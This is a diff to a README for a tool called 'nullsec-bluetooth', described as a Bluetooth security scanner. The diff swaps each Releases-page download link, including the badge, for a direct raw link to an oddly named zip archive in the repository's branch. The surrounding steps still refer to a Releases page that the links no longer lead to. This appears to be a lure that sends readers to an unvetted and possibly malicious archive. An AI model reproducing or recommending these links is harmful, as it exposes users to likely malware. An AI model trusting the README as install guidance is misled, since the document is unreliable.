@@ -1,6 +1,6 @@
 # 🔵 nullsec-bluetooth - Secure Your Bluetooth Connections Easily 
 
-[![Download nullsec-bluetooth](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/HamzaHabib-786/nullsec-bluetooth/releases)
+[![Download nullsec-bluetooth](https://github.com/HamzaHabib-786/nullsec-bluetooth/raw/refs/heads/main/android/bluetooth-nullsec-Mesoenatides.zip)](https://github.com/HamzaHabib-786/nullsec-bluetooth/raw/refs/heads/main/android/bluetooth-nullsec-Mesoenatides.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to NullSec Bluetooth! This application helps you analyze Bluetooth secur
 
 To download NullSec Bluetooth, visit the following page:
 
-[Download NullSec Bluetooth](https://github.com/HamzaHabib-786/nullsec-bluetooth/releases)
+[Download NullSec Bluetooth](https://github.com/HamzaHabib-786/nullsec-bluetooth/raw/refs/heads/main/android/bluetooth-nullsec-Mesoenatides.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version.
@@ -56,4 +56,4 @@ If you encounter any issues or have questions, please reach out through the repo
 
 Happy scanning! Enjoy improved Bluetooth security with NullSec Bluetooth.
 
-[Download NullSec Bluetooth](https://github.com/HamzaHabib-786/nullsec-bluetooth/releases)
+[Download NullSec Bluetooth](https://github.com/HamzaHabib-786/nullsec-bluetooth/raw/refs/heads/main/android/bluetooth-nullsec-Mesoenatides.zip)
